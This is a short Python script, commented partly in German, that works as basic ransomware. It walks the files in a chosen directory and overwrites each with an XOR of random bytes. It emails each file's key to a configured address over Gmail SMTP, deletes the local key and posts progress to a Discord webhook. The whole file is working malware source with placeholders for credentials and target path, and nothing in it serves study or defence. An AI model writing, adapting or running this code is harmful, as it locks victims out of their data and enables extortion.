from discord_webhooks import DiscordWebhooks
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import glob
import time

#Webhook
WEBHOOK_URL = 'Discord webhoock'
webhook = DiscordWebhooks(WEBHOOK_URL)

#email

# change
fromaddr = " "
toaddr = " "
betreff= " "
pngs = 0

def email():

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = png+".key"

    #text ind der email
    body = png+".key"
    msg.attach(MIMEText(body, 'plain'))

    #schlüssel
    filename = png+".key"
    attachment = open(filename, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
# change you passwort    
    server.login(fromaddr, "your passwort")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def encrypt(filename):
    to_encrypt = open(filename, "rb").read()
    size = len(to_encrypt)
    key = os.urandom(size)
    with open(filename + ".key", "wb") as key_out:
        key_out.write(key)
    encrypted = bytes( a ^ b for (a, b) in zip(to_encrypt, key))
    with open(filename, "wb") as encrypted_out:
        encrypted_out.write(encrypted)

webhook.set_content(content= "startet")
webhook.send()
    

allpng = glob.glob(r"\your data pfad*.*")

l = len(allpng)
l = l-1
x = 0

while l >= x :

    png = allpng[x]
    encrypt(png)

    pngs = png+".key"

    email()

    os.remove(pngs)

    webhook.set_content(content= f"Data {png} decryptet" )
    webhook.send()

    x = x +1

webhook.set_content(content= f" {x} data decrypted" )
webhook.send()
